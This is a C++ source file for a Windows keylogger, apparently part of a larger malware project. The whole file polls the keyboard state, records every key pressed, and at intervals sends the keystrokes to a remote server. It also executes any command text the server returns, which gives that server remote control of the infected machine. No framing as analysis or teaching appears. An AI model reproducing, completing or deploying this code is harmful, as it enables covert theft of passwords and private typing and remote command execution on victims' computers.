#include "stdafx.h"
#include "Keylogger.h"
#include "Hax.h"
#include "Network.h"
#include "Settings.h"
#include "Util.h"

Keylogger keylogger;

const int V_KEY_BEGIN   = 0x08; // [BACK]
const int V_KEY_END     = 0x91; // [SCROLLLOCK]

// http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731%28v=vs.85%29.aspx
static const char* keyStrings[] =
{
	0, 0, 0, 0, 0, 0, 0, 0, "[BACK]", "[TAB]", 0, 0, 0, "[ENTER]", 0, 0,
	"[SHIFT]", "[CTRL]", "[ALT]", "[PAUSE]", "[CAPS]", 0, 0, 0, 0, 0, 0, "[ESC]", 0, 0, 0, 0,
	" ", "[PGUP]", "[PGDOWN]", "[END]", "[HOME]", "[<]", "[^]", "[>]", "[v]", "[SELECT]", "[PRINT]", "[EXECUTE]", "[PRINTSCREEN]", "[INS]", "[DEL]", "[HELP]",
	"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", 0, 0, 0, 0, 0, 0,
	0, "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O",
	"P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "[LWIN]", "[RWIN]", "[APPS]", 0, "[SLEEP]",
	"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "*", "+", 0, "-", ".", "/",
	"[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]", "[F11]", "[F12]", "[F13]", "[F14]", "[F15]", "[F16]",
	"[F17]", "[F18]", "[F19]", "[F20]", "[F21]", "[F22]", "[F23]", "[F24]", 0, 0, 0, 0, 0, 0, 0, 0,
	"[NUMLOCK]", "[SCROLLLOCK]", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
};
static const char* keyStringsNoShift[] =
{
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o",
	"p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
};

Keylogger::Keylogger() : shouldStop(false), sendInterval(V_SEND_INTERVAL_MIN)
{
	memset(keysActive, false, sizeof(keysActive));
}
Keylogger::~Keylogger()
{

}

void Keylogger::Run()
{
	DWORD ticksLast = GetTickCount();

	for (;;)
	{
		Sleep(V_IDLE_TIME);

		if (GetTickCount() - ticksLast >= this->sendInterval)
		{
			this->Send();
			keysPressed.clear();

			if (this->shouldStop)
				break;

			ticksLast = GetTickCount();
		}

		bool shift = ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0)
					^ ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
		for(int i = V_KEY_BEGIN; i <= V_KEY_END; i++)
		{
			this->CheckKey(i, shift);
		}
	}
}
void Keylogger::Stop()
{
	this->shouldStop = true;
}

void Keylogger::CheckKey(short i, bool shift)
{
	if (GetAsyncKeyState(i) & 0x8000)
	{
		if (!keysActive[i])
		{
			keysActive[i] = true;
			
			const char* str     = keyStrings[i];
			const char* str_ns  = keyStringsNoShift[i];
			if (str_ns && !shift)
			{
				keysPressed.push_back(str_ns);
			}
			else if (str)
			{
				keysPressed.push_back(str);
			}
		 }
	}
	else
	{
		keysActive[i] = false;
	}
}

void Keylogger::Send()
{
	std::string msgText = "d=";

	std::vector<const char*>::const_iterator itr;
	for (   itr = keysPressed.begin();
			itr != keysPressed.end();
			itr++)
	{
		msgText += *itr;
	}

	size_t msgText_len = msgText.size();
	
	size_t resp_len;
	char *resp;
	bool ret = network.SendAndGetText(V_NET_FILE_DATA, msgText.c_str(), &resp_len, &resp);

	if (ret && resp_len > 0)
	{
		this->IncreaseSendInterval();

		std::string str(resp, resp_len);
		std::tstring tstr = Util::s2t(str);
		cmd.Run(tstr);
	}
	else
	{
		this->DecreaseSendInterval();
	}

	if (ret) free(resp);
}

void Keylogger::IncreaseSendInterval()
{
	this->sendInterval = max(V_SEND_INTERVAL_MIN, this->sendInterval / 2);
}
void Keylogger::DecreaseSendInterval()
{
	this->sendInterval = min(V_SEND_INTERVAL_MAX, this->sendInterval * 20 / 19);
}